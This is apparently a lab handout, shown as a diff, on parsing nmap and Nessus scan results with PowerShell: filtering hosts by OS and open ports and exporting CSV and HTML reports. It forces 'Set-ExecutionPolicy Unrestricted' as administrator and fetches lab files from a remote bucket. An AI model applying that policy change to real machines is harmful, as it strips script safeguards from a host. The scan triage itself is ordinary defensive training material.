+(new-object System.Net.WebClient).DownloadFile("https://infosecaddicts-files.s3.amazonaws.com/samplescan.xml", "c:\ps\PowerShell-Files\samplescan.xml")
+---------------------------------------------------------------
+ 
+ 
+Run Powershell as administrator
+------------------------Type This------------------------------
+cd C:\ps\\PowerShell-Files
+ 
+Get-ExecutionPolicy
+Set-ExecutionPolicy Unrestricted –Force
+---------------------------------------------------------------
+ 
+ 
+Parse nmap XML
+------------------------Type This------------------------------
+.\parse-nmap.ps1 samplescan.xml
+---------------------------------------------------------------
+ 
+ 
+Process all XML files
+------------------------Type This------------------------------
+.\parse-nmap.ps1 *.xml
+---------------------------------------------------------------
+ 
+Piping also works
+------------------------Type This------------------------------
+dir *.xml | .\parse-nmap.ps1
+---------------------------------------------------------------
+ 
+Advanced parsing with filtering conditions
+------------------------Type This------------------------------
+.\parse-nmap.ps1 samplescan.xml | where {$_.OS -like "*Windows XP*"} | format-table IPv4,HostName,OS
+---------------------------------------------------------------
+ 
+ 
+More parsing
+------------------------Type This------------------------------
+.\parse-nmap.ps1 samplescan.xml | where {$_.Ports -like "*open:tcp:22*"}
+---------------------------------------------------------------
+ 
+Parsing with match and multiple conditions
+------------------------Type This------------------------------
+.\parse-nmap.ps1 samplescan.xml |where {$_.Ports -match "open:tcp:80|open:tcp:443"}
+---------------------------------------------------------------
+ 
+ 
+CSV Export
+------------------------Type This------------------------------
+.\parse-nmap.ps1 samplescan.xml -outputdelimiter " " | where {$_.Ports -match "open:tcp:80"} | export-csv weblisteners.csv
+---------------------------------------------------------------
+ 
+Import Data from CSV
+------------------------Type This------------------------------
+$data = import-csv weblisteners.csv
+$data | where {($_.IPv4 -like "10.57.*") -and ($_.Ports -match "open:tcp:22")}
+---------------------------------------------------------------
+ 
+ 
+Export to HTML
+------------------------Type This------------------------------
+.\parse-nmap.ps1 samplescan.xml -outputdelimiter " " |select-object IPv4,HostName,OS | ConvertTo-Html | out-file report.html
+---------------------------------------------------------------
+ 
+ 
+########################################
+# Parsing Nessus scans with PowerShell #
+########################################
+If you are NOT using the Win7 VM provided then you can get the required files for this lab which are located in this zip file:
+https://infosecaddicts-files.s3.amazonaws.com/PowerShell-Files.zip
+ 
+ 
+ 
+Let's take a look at the Import-Csv cmdlet and what are the members of the object it returns:
+------------------------Type This------------------------------
+Import-Csv c:\ps\PowerShell-Files\class_nessus.csv | Get-Member
+---------------------------------------------------------------
+ 
+filter the objects:
+ 
+------------------------Type This------------------------------
+Import-Csv c:\ps\PowerShell-Files\class_nessus.csv | where {$_.risk -eq "high"}
+---------------------------------------------------------------
+ 
+use the Select-Object cmdlet and only get unique entries:
+------------------------Type This------------------------------
+Import-Csv c:\ps\PowerShell-Files\class_nessus.csv | where {$_.risk -eq "high"} | select host -Unique
+ 
+Import-Csv c:\ps\PowerShell-Files\class_nessus.csv | where {"high","medium","low" -contains $_.risk} | select "Plugin ID", CVE, CVSS, Risk, Host, Protocol, Port, Name | Out-GridView
+------------------------Type This------------------------------
+ 
+ConvertTo-Html cmdlet and turn it in to an HTML report in list format:
+------------------------Type This------------------------------
+Import-Csv c:\ps\PowerShell-Files\class_nessus.csv | where {"high","medium","low" -contains $_.risk} | select "Plugin ID", CVE, CVSS, Risk, Host, Protocol, Port, Name | ConvertTo-Html -As List > C:\report2.html
+---------------------------------------------------------------
